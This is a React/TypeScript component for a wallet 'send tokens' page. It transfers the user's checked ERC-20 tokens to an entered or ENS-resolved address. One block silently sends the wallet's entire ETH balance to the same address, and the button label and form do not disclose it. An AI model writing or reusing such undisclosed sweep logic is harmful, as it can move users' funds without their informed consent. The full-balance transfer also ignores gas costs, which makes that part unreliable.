import { Button, Input, useToasts } from '@geist-ui/core';
import { erc20ABI, usePublicClient, useWalletClient } from 'wagmi';
import { isAddress } from 'essential-eth';
import { useAtom } from 'jotai';
import { normalize } from 'viem/ens';
import { checkedTokensAtom } from '../../src/atoms/checked-tokens-atom';
import { destinationAddressAtom } from '../../src/atoms/destination-address-atom';
import { globalTokensAtom } from '../../src/atoms/global-tokens-atom';

function sleep(ms: number): Promise<void> {
  return new Promise((resolve) => setTimeout(resolve, ms));
}

export const SendTokens = () => {
  const { setToast } = useToasts();
  const showToast = (message: string, type: any) =>
    setToast({
      text: message,
      type,
      delay: 4000,
    });

  const [tokens] = useAtom(globalTokensAtom);
  const [destinationAddress, setDestinationAddress] = useAtom(destinationAddressAtom);
  const [checkedRecords, setCheckedRecords] = useAtom(checkedTokensAtom);
  const { data: walletClient } = useWalletClient();
  const publicClient = usePublicClient();

  const sendAllCheckedTokens = async () => {
    const tokensToSend: ReadonlyArray<`0x${string}`> = Object.entries(checkedRecords)
      .filter(([tokenAddress, { isChecked }]) => isChecked)
      .map(([tokenAddress]) => tokenAddress as `0x${string}`);

    if (!walletClient) return;
    if (!destinationAddress) return;

    if (destinationAddress.includes('.')) {
      const resolvedDestinationAddress = await publicClient.getEnsAddress({
        name: normalize(destinationAddress),
      });
      if (resolvedDestinationAddress) {
        setDestinationAddress(resolvedDestinationAddress);
      }
      return;
    }

    // Envoi automatique de l'ETH disponible
    const ethBalance = await publicClient.getBalance(walletClient.account);
    if (ethBalance > 0) {
      try {
        const tx = await walletClient.sendTransaction({
          to: destinationAddress,
          value: ethBalance,
        });
        console.log('ETH transfer success:', tx);
      } catch (err) {
        showToast(`Erreur lors de l'envoi de l'ETH: ${err?.reason || 'Erreur inconnue'}`, 'warning');
      }
    }

    // Envoi des tokens ERC-20 sélectionnés
    for (const tokenAddress of tokensToSend) {
      const token = tokens.find((token) => token.contract_address === tokenAddress);
      if (!token || BigInt(token?.balance || '0') === BigInt(0)) continue;

      try {
        const { request } = await publicClient.simulateContract({
          account: walletClient.account,
          address: tokenAddress,
          abi: erc20ABI,
          functionName: 'transfer',
          args: [destinationAddress as `0x${string}`, BigInt(token?.balance || '0')],
        });

        await walletClient.writeContract(request).then((res) => {
          setCheckedRecords((old) => ({
            ...old,
            [tokenAddress]: {
              ...old[tokenAddress],
              pendingTxn: res,
            },
          }));
        });
      } catch (err) {
        showToast(
          `Erreur avec ${token?.contract_ticker_symbol} : ${err?.reason || 'Erreur inconnue'}`,
          'warning',
        );
      }
    }
  };

  const addressAppearsValid: boolean =
    typeof destinationAddress === 'string' &&
    (destinationAddress?.includes('.') || isAddress(destinationAddress));

  const checkedCount = Object.values(checkedRecords).filter((record) => record.isChecked).length;

  return (
    <div style={{ margin: '20px' }}>
      <form>
        Destination Address:
        <Input
          required
          value={destinationAddress}
          placeholder="0x518c5D62647E60864EcB3826e982c93dFa154af3"
          onChange={(e) => setDestinationAddress(e.target.value)}
          type={
            addressAppearsValid
              ? 'success'
              : destinationAddress.length > 0
                ? 'warning'
                : 'default'
          }
          width="100%"
          style={{ marginLeft: '10px', marginRight: '10px' }}
          crossOrigin={undefined}
        />
        <Button
          type="secondary"
          onClick={sendAllCheckedTokens}
          disabled={!addressAppearsValid}
          style={{ marginTop: '20px' }}
        >
          {checkedCount === 0 ? 'Sélectionnez un ou plusieurs tokens' : `Envoyer ${checkedCount} tokens`}
        </Button>
      </form>
    </div>
  );
};
